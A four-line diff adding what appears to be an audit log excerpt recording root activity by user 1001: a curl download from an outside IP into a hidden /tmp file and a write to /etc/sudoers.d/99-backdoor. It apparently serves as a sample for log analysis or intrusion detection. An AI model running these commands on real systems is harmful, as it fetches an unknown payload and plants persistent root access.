@@ -1,0 +1,4 @@
+09:44:12 #4521 key=exec auid=1001 uid=0
+  cmd: curl -so /tmp/.x http://203.0.113.9/p  paths: /usr/bin/curl /lib64/ld-linux-x86-64.so.2
+09:44:41 #4533 key=priv auid=1001 uid=0
+  cmd: tee /etc/sudoers.d/99-backdoor  paths: /etc/sudoers.d/ /etc/sudoers.d/99-backdoor
